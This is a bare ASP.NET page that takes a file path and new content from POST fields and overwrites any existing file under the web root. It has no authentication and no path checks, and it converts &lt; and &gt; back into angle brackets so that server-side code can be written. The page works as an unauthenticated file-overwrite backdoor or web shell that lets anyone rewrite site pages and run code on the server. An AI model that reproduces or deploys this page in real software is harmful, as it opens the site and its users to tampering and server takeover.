<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web.Hosting" %>

<% 
	string root = HostingEnvironment.MapPath("~");
	string path = Request.Form["path"];
	string content = Request.Form["content"];


	if (path == null){
		Response.Write("need POST{path}!");
		return;
	}
	if (content == null){
		Response.Write("need POST{content}!");
		return;
	}
	
	string filePath = root + "/" + path;
	if (!File.Exists(filePath)) {
		Response.Write(path + " is not a file");
		return;
	}
	
	content = content.Replace("&lt;", "<");
	content = content.Replace("&gt;", ">");
	File.WriteAllText(filePath, content);
%>